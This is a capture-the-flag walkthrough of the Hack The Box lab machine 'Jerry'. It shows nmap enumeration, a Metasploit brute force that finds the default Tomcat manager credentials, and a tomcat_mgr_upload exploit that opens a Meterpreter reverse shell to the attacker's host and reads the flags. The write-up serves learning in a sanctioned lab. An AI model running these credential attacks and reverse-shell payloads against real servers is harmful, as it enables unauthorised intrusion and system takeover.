## Description
Although Jerry is one of the easier machines on Hack The Box, it is realistic as Apache Tomcat is often found exposed and configured with common or weak credentials.
## Information gathering
Let's run a nmap scan of the TCP ports:
```
$nmap -p- 10.129.136.9
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-01 19:43 CEST
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.06 seconds
```
Ping seems blocked, so I will try again with `-Pn` as suggested:
```
$nmap -Pn -p- -oN nmap  10.129.136.9
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-01 19:44 CEST
Nmap scan report for 10.129.136.9
Host is up (0.021s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 104.39 seconds
```
There is only one port open which seems to correspond to an HTTP server:
```
$nmap -Pn -p8080 -sC -sV -oN nmap_http 10.129.136.9
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-01 19:47 CEST
Nmap scan report for 10.129.136.9
Host is up (0.020s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.23 seconds
```
An Apache Tomcat 7.0.88 server is running with Coyote JSP engine 1.1. Let's look at it in a browser: we get the administration interface of Tomcat. By clicking on Server status, there is a basic authentication. I tried `admin/admin` credentials and it works immediately. However, if I try to list all the applications, I have an "Access Denied" error. But if you click on server status, you can get the list of the applications which are:
```
localhost/docs
localhost/
localhost/examples
localhost/manager
localhost/host-manager
```
Below this list, you can get the list of all the mappings. I tried to access to the `manager` but only the `status` endpoint seems available with the credentials `admin/admin`. For the `host-manager`, I am not able to access to anything. I noticed there is an auxiliary tool in MetaSploit that is able to bruteforce the admin interface with standard credentials:
```
[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/http/tomcat_mgr_login
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> options

Module options (auxiliary/scanner/http/tomcat_mgr_login):

   Name              Current Setting                                         Required  Description
   ----              ---------------                                         --------  -----------
   BLANK_PASSWORDS   false                                                   no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                       yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                   no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                   no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                   no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none                                                    no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASSWORD                                                                  no        The HTTP password to specify for authentication
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_  no        File containing passwords, one per line
                     mgr_default_pass.txt
   Proxies                                                                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                                                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.htm
                                                                                       l
   RPORT             8080                                                    yes       The target port (TCP)
   SSL               false                                                   no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS   false                                                   yes       Stop guessing when a credential works for a host
   TARGETURI         /manager/html                                           yes       URI for Manager login. Default is /manager/html
   THREADS           1                                                       yes       The number of concurrent threads (max one per host)
   USERNAME                                                                  no        The HTTP username to specify for authentication
   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/tomcat_  no        File containing users and passwords separated by space, one pair per line
                     mgr_default_userpass.txt
   USER_AS_PASS      false                                                   no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_  no        File containing users, one per line
                     mgr_default_users.txt
   VERBOSE           true                                                    yes       Whether to print output for all attempts
   VHOST                                                                     no        HTTP server virtual host


View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set BLANK_PASSWORDS true
BLANK_PASSWORDS => true
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set RHOSTS 10.129.75.157
RHOSTS => 10.129.75.157
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set USER_AS_PASS true
USER_AS_PASS => true
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> run

[!] No active DB -- Credential data will not be saved!
[...]
[+] 10.129.75.157:8080 - Login Successful: tomcat:s3cret
[...]
```
We can now access to the application manager. The most interesting thing with that is that we can deploy a WAR file on the server.

Also, from the home page, you can go to the examples page: `http://10.129.136.9:8080/examples/`. The following examples are available:
```
Servlets examples
JSP Examples
WebSocket (JSR356) Examples
WebSocket Examples using the deprecated Apache Tomcat proprietary API
```
It is interesting to note that the examples using a deprecated API are available.

I also did a UDP scan:
```
$sudo nmap -sU -oN nmap_udp 10.129.136.9
[sudo] password for x5450: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-03 18:48 CEST
Nmap scan report for 10.129.136.9
Host is up (0.021s latency).
All 1000 scanned ports on 10.129.136.9 are in ignored states.
Not shown: 1000 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 22.34 seconds
```
No UDP ports seem open.
## Vulnerability assessment
### nmap scan
Let's start by looking at any known vulnerabilities for Apache Tomcat/7.0.88. First, let's see if nmap is able to find something:
```
$nmap -Pn -p8080 --script vuln -oN nmap_vuln 10.129.136.9
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-03 19:06 CEST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.129.136.9
Host is up (0.020s latency).

PORT     STATE SERVICE
8080/tcp open  http-proxy
| http-enum: 
|   /examples/: Sample scripts
|   /manager/html/upload: Apache Tomcat (401 Unauthorized)
|   /manager/html: Apache Tomcat (401 Unauthorized)
|_  /docs/: Potentially interesting folder
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/

Nmap done: 1 IP address (1 host up) scanned in 109.18 seconds
```
`nmap` returns only a DOS vulnerability which is not interesting in our case.
### Apache Tomcat CVEs
Let's look at the CVEs. It seems to have an important [list of vulnerabilities](https://www.cybersecurity-help.cz/vdb/apache_foundation/apache_tomcat/7.0.88/), specially two RCEs: [CVE-2020-9484](https://www.cybersecurity-help.cz/vulnerabilities/28158/) and [CVE-2019-0232](https://www.cybersecurity-help.cz/vulnerabilities/18236/).
The second vulnerability is only exploitable on Windows. Let's use nmap to check the target OS:
```
$sudo nmap -O -oN nmap_os 10.129.136.9
[sudo] password for x5450: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-03 19:13 CEST
Nmap scan report for 10.129.136.9
Host is up (0.020s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE
8080/tcp open  http-proxy
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.06 seconds
```
It is very likely that the OS is Windows and so make this vulnerability exploitable. Moreover, it seems to exist an MSF exploit available on [exploit-db](https://www.exploit-db.com/exploits/47073). However, it requires a CGI script to exploit the vulnerability.
The first vulnerability is on file upload and there is no upload form is what we list before.
### Deprecated API
Another interesting issue could be the examples using the deprecated API, but I have not been able to find any exploitable vulnerability.
### Manager application
It is possible to upload a WAR application on the server and MetaSploit has an exploit for that: `exploit/multi/http/tomcat_mgr_upload`.
## Exploitation
Let's try to exploit the server by uploading an application using MetaSploit module `exploit/multi/http/tomcat_mgr_upload`:
```
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> use exploit/multi/http/tomcat_mgr_upload
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> info

       Name: Apache Tomcat Manager Authenticated Upload Code Execution
     Module: exploit/multi/http/tomcat_mgr_upload
   Platform: Java, Linux, Windows
       Arch: 
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2009-11-09

Provided by:
  rangercha

Available targets:
      Id  Name
      --  ----
  =>  0   Java Universal
      1   Windows Universal
      2   Linux x86

Check supported:
  Yes

Basic options:
  Name          Current Setting  Required  Description
  ----          ---------------  --------  -----------
  HttpPassword                   no        The password for the specified username
  HttpUsername                   no        The username to authenticate as
  Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT         80               yes       The target port (TCP)
  SSL           false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
  VHOST                          no        HTTP server virtual host

Payload information:

Description:
  This module can be used to execute a payload on Apache Tomcat 
  servers that have an exposed "manager" application. The payload is 
  uploaded as a WAR archive containing a jsp application using a POST 
  request against the /manager/html/upload component. NOTE: The 
  compatible payload sets vary based on the selected target. For 
  example, you must select the Windows target to use native Windows 
  payloads.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2009-3843
  OSVDB (60317)
  https://nvd.nist.gov/vuln/detail/CVE-2009-4189
  OSVDB (60670)
  https://nvd.nist.gov/vuln/detail/CVE-2009-4188
  http://www.securityfocus.com/bid/38084
  https://nvd.nist.gov/vuln/detail/CVE-2010-0557
  http://www-01.ibm.com/support/docview.wss?uid=swg21419179
  https://nvd.nist.gov/vuln/detail/CVE-2010-4094
  http://www.zerodayinitiative.com/advisories/ZDI-10-214
  https://nvd.nist.gov/vuln/detail/CVE-2009-3548
  OSVDB (60176)
  http://www.securityfocus.com/bid/36954
  http://tomcat.apache.org/tomcat-5.5-doc/manager-howto.html


View the full module info with the info -d command.
```
We saw that the target is running on Windows, so we need to change it:
```
[msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> set target 1
target => 1
[msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> set HttpPassword s3cret
HttpPassword => s3cret
[msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> set HttpUsername tomcat
HttpUsername => tomcat
[msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> set RHOSTS 10.129.75.157
RHOSTS => 10.129.75.157
[msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> set RPORT 8080
RPORT => 8080
[msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> run

[-] Exploit failed: java/meterpreter/reverse_tcp is not a compatible payload.
[*] Exploit completed, but no session was created.
```
Apparently, we cannot use the default payload. Let's use a Windows-specific payload:
```
[msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> run

[*] Started reverse TCP handler on 192.168.0.87:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying FEXjXwubN02rJ1Hb7yfTrEgOq...
[*] Executing FEXjXwubN02rJ1Hb7yfTrEgOq...
[*] Undeploying FEXjXwubN02rJ1Hb7yfTrEgOq ...
[*] Undeployed at /manager/html/undeploy
[*] Exploit completed, but no session was created.
```
It is better but not enough. Indeed, I forget to configure `LHOST`:
```
[msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> set LHOST tun0
LHOST => 10.10.14.45
[msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> exploit

[*] Started reverse TCP handler on 10.10.14.45:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying NLixWIBXkKRkT...
[*] Executing NLixWIBXkKRkT...
[*] Sending stage (175686 bytes) to 10.129.75.157
[*] Undeploying NLixWIBXkKRkT ...
[*] Undeployed at /manager/html/undeploy
[*] Meterpreter session 1 opened (10.10.14.45:4444 -> 10.129.75.157:49194) at 2023-10-22 11:23:04 +0200

(Meterpreter 1)(C:\apache-tomcat-7.0.88) > 
```
We can now search for the flag. I looked at the `Users` directory one by one to finally found the flags:
```
(Meterpreter 1)(C:\apache-tomcat-7.0.88) > cd C:\\Users\\Administrator\\Desktop\\
(Meterpreter 1)(C:\Users\Administrator\Desktop) > dir
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2018-06-19 05:43:09 +0200  desktop.ini
040777/rwxrwxrwx  0     dir   2018-06-19 06:09:40 +0200  flags

(Meterpreter 1)(C:\Users\Administrator\Desktop) > cd flags\\
(Meterpreter 1)(C:\Users\Administrator\Desktop\flags) > dir
Listing: C:\Users\Administrator\Desktop\flags
=============================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  88    fil   2018-06-19 06:11:36 +0200  2 for the price of 1.txt

(Meterpreter 1)(C:\Users\Administrator\Desktop\flags) > cat 2\ for\ the\ price\ of\ 1.txt 
user.txt
7[...SNIP...]0

root.txt
0[...SNIP...]e
```
What a surprise! Both flags are here. No privilege escalation required for this machine!
## Learning from other writeups
### Official writeup
To scan the opened ports, `masscan` is used. Apparently, it is faster than `nmap`. It can be an idea to use it, specifically for a big network, not a single machine. In this writeup, MetaSploit is not used. This is interesting to see how to create a WAR file from scratch. It seems to be just a `jsp` page that is archived using the command `jar -cvf ../wshell.war *`. They use another post-exploitation tool: [`SILENTTRINITY`](https://github.com/byt3bl33d3r/SILENTTRINITY).
Looking at the [video walkthrough](https://www.youtube.com/watch?v=PJeBIey8gc4), this is interesting to note how to intercept queries using `FoxyProxy` Firefox plugin and `BurpSuite`. Nothing essential for this box but still interesting to note.
For the bruteforce, `hydra` is used, and this tool has a `-C` option which can take a file where each line contains credentials on the format `user:pass`. This is the format of the wordlist `Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt` of `SecLists`.
Another interesting stuff with `hydra` is the use of the `HYDRA_PROXY_HTTP` to send all the queries to `BurpSuite` and get the history in that tool. I bet it can work with `OWASP ZAP` too.
`msfvenom` can be used to generate payloads in a bunch of different formats. `war` format is supported. Then, MetaSploit is used to run a multi handler exploit. It could be interesting to learn more about that in the future.
### 0xdf writeup
The writeup is available [here](https://0xdf.gitlab.io/2018/11/17/htb-jerry.html). The "Beyond Root" section goes deeper inside the exploit generated by `msfvenom`.
### rana-khalil writeup
The writeup is available [here](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/jerry-writeup-w-o-metasploit). He uses a home-made script [`nmapAutomator`](https://github.com/rkhal101/nmapAutomator) to automate the enumeration. This script uses `nikto` that I does not know: it is a vulnerability scanner looking for dangerous files and outdated server software programs. This is interesting because this tool directly found that the manager was protected with default credentials `tomcat:s3cret`.
## Lessons learned
I lost a lot of time because I considered that we cannot have the credentials for the manager. I think I should take more time in the information gathering to look at the existing tools to enumerate users, find credentials... It may be interesting to take a deeper look at the auxiliary tools of MetaSploit. It will be also interesting to look at the features of `nikto`. Then, to simplify the enumeration, I may use `nmapAutomator`, but I prefer to not use it right now in order to continue to understand the tools that I am using.